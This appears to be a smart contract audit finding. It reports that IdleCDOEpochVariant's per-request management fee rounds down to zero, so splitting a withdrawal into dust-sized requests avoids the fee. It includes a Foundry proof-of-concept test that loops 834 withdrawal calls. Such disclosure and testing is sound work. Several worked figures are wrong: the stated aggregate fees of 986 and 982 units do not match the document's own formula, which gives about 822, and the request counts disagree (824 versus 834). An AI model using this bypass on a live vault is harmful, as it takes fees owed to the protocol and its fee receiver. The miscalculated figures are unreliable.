### Title
Withdrawal management fee can be bypassed by splitting requests into dust amounts - (File: contracts/IdleCDOEpochVariant.sol)

### Summary

`IdleCDOEpochVariant.requestWithdraw` calculates an upfront management fee separately for every withdrawal request. Because `_calculateManagementFee` rounds down to integer underlying units, an attacker can split one withdrawal into many requests whose principals are below the nonzero-fee threshold. Each request pays zero fee while the aggregate withdrawal escapes nearly the entire management fee.

### Finding Description

Every `requestWithdraw` converts tranche tokens to underlying principal, calculates projected interest, then independently calls `_totalWithdrawFees` [1](#0-0) . That function derives the management fee for exactly the principal of that request [2](#0-1) .

The fee is floored:

```solidity
return _nav * managementFee * _duration / 3153600000000;
``` [3](#0-2) 

For a 1% management fee (`managementFee = 1_000`) and a 30-day withdrawal fee duration, any principal satisfying:

```text
principal * 1_000 * 2_592_000 < 3_153_600_000_000
```

pays zero management fee. The threshold is `1,216` underlying base units. With a two-decimal underlying, each `12.16`-token-or-smaller request pays no management fee. The strategy explicitly accumulates multiple receipts for the same user rather than requiring one request per user or epoch [4](#0-3) .

Thus a KYC-passing tranche holder can divide a large withdrawal into enough small `requestWithdraw` calls to keep every per-request fee at zero, then claim all receipts together after the following epoch.

### Impact Explanation

The vault loses management fees that should have been charged on withdrawal receipts. For example, withdrawing `1,000,000` base units at a 1% annualized fee over 30 days should accrue approximately `986` base units of management fee, but splitting the withdrawal into 824 requests of no more than `1,216` units can reduce the charged management fee to zero.

This is a direct loss of protocol fees and causes `pendingWithdrawFees` to understate the amount ultimately owed to `feeReceiver` and the owner.

### Likelihood Explanation

Likelihood depends on deployment parameters:

- `managementFee` must be nonzero.
- The attacker must control enough tranche tokens to make splitting worthwhile.
- Low-decimal underlying tokens make each request economically larger, reducing the number of transactions.
- Requests must be made while withdrawal requests are open.
- There is no minimum withdrawal amount, per-user request limit, or aggregation of principal across requests before calculating fees.

KYC does not prevent the attack; an allowed lender can perform all calls.

### Recommendation

Calculate withdrawal management fees from the caller’s aggregate pending principal for the epoch rather than independently per request. Alternatively, enforce a minimum withdrawal principal above the rounding threshold, or round management fees up whenever the charged amount is nonzero. Any minimum must account for the variable duration returned by `_withdrawRequestManagementFeeDuration`.

### Proof of Concept

The following Foundry-style test assumes:

- underlying token has two decimals;
- tranche tokens use `18` decimals;
- tranche price is `100`, so `12e18` tranche tokens correspond to `1,200` underlying units;
- `managementFee = 1_000` (`1%`);
- `epochDuration = 30 days`;
- `bufferPeriod = 0`;
- withdrawal requests are open.

```solidity
function testSplitWithdrawRequestsBypassManagementFee() public {
    uint256 requests = 834;
    uint256 chunkUnderlying = 1_200;
    uint256 chunkTranche = 12e18;
    uint256 totalUnderlying = chunkUnderlying * requests; // 1,000,800

    // Attacker already holds enough AA tranche tokens and passes isWalletAllowed.
    deal(
        address(AAtranche),
        attacker,
        chunkTranche * requests
    );

    uint256 duration = 30 days;
    uint256 aggregateFee =
        totalUnderlying * 1_000 * duration / 3_153_600_000_000;

    // Sanity check: the intended aggregate fee is nonzero.
    assertGt(aggregateFee, 0);

    uint256 pendingFeesBefore = cdoEpoch.pendingWithdrawFees();
    uint256 pendingWithdrawsBefore =
        IdleCreditVault(address(strategy)).pendingWithdraws();

    vm.startPrank(attacker);
    for (uint256 i = 0; i < requests; ++i) {
        cdoEpoch.requestWithdraw(chunkTranche, address(AAtranche));
    }
    vm.stopPrank();

    assertEq(
        cdoEpoch.pendingWithdrawFees() - pendingFeesBefore,
        0,
        "every dust request paid zero management fee"
    );

    // The receipts reserve approximately the full principal instead of
    // principal minus the aggregate management fee.
    assertGe(
        IdleCreditVault(address(strategy)).pendingWithdraws()
            - pendingWithdrawsBefore,
        totalUnderlying - requests,
        "split requests avoided aggregate management fee"
    );
}
```

Each request satisfies:

```text
1_200 * 1_000 * 2_592_000
    = 3_110_400_000_000
    < 3_153_600_000_000
```

so `_calculateManagementFee` returns `0`, while a single aggregate request for `1,000,800` units would return `982` units.
